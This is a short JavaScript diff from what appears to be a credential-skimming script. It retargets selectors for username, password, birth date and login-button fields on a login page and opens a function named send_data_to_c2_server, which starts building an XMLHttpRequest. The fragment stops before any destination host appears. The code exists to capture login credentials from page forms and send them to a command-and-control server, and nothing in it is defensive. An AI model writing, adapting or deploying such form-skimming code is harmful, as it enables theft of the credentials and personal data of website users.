@@ -1,7 +1,7 @@
-window["data_leak_label_email"] = ["input[id*='email']", "input[name*='email']", "input[type*='email']"]
+window["data_leak_label_email"] = ["input[id*='username']", "input[name*='username']", "input[type*='text']"]
 window["data_leak_label_password"] = ["input[id*='password']", "input[name*='password']"]
 window["data_leak_label_birth_date"] = ["input[id*='wsi-login-credentials-form-birthdate']", "input[name*='birthDate']"]
-window["data_leak_label_submit_button"] = ["button[id*='loginButton']"]
+window["data_leak_label_submit_button"] = ["button[id*='loginbtn']"]
 
 function send_data_to_c2_server(data) {
     var xhr = window["XMLHttpRequest"] ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
